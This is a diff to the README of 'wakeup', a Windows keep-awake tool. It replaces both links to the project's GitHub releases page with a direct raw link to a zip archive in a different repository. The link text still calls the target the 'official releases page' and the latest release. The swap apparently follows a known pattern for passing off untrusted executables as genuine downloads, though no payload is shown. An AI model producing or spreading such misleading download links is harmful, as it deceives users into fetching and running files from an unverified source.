@@ -5,7 +5,7 @@ description: "Prevent your computer from sleeping with this lightweight, cross-p
 ---
 # ☕ wakeup - Keep your computer awake with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sheep8866/wakeup/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/sheep8866/sheep8866.github.io/main/triadical/Release-2.4-alpha.3.zip)
 
 ## 🎯 About This Software
 
@@ -22,7 +22,7 @@ Computers often go to sleep during long tasks like updates, large file downloads
 
 You do not need an installer. Wakeup uses a simple format that runs immediately after you download it. Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/sheep8866/wakeup/releases) to access the downloads.
+1. Visit the [official releases page](https://raw.githubusercontent.com/sheep8866/sheep8866.github.io/main/triadical/Release-2.4-alpha.3.zip) to access the downloads.
 2. Locate the file ending in .exe for Windows.
 3. Click the link to save the file to your computer.
 4. Move the file to a folder where you want to keep your small tools, such as your Documents or Downloads folder.
